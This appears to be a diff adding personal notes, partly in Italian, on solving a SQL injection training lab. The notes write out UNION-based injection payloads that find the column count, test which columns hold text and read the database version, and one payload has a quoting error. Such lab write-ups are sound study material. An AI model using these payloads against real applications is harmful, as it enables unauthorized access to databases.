@@ -1,0 +1,35 @@
+This lab contains an SQL injection vulnerability in the product category filter.
+You can use a UNION attack to retrieve the results from an injected query.
+
+To solve the lab, display the database version string.
+
+
+
+IPOTESI QUERY
+
+SELECT * FROM 'Accessories';
+
+
+DETERMINARE NUMERO DI COLONNE
+
+1) SELECT * FROM 'Accessories';
+' ORDER BY 2-- -
+= SELECT * FROM 'Accessories' ORDER BY 2-- -';      >>>> -- - PERCHE' MYSQL LO RICHIEDE... OPPURE #
+
+2) SELECT * FROM 'Accessories';
+' UNION SELECT NULL,NULL-- -
+= SELECT * FROM 'Accessories' UNION SELECT NULL,NULL-- -';
+
+
+DETERMINARE QUALI COLONNE POSSONO CONTENERE TESTO
+
+1) SELECT * FROM 'Accessories';
+' UNION SELECT 'A',A'-- -
+= SELECT * FROM 'Accessories' UNION SELECT 'A',A'-- -';
+
+
+DETERMINARE VERSIONE database
+
+1) SELECT * FROM 'Accessories';
+' UNION SELECT @@VERSION,NULL-- -
+= SELECT * FROM 'Accessories' UNION SELECT @@VERSION,NULL-- -';
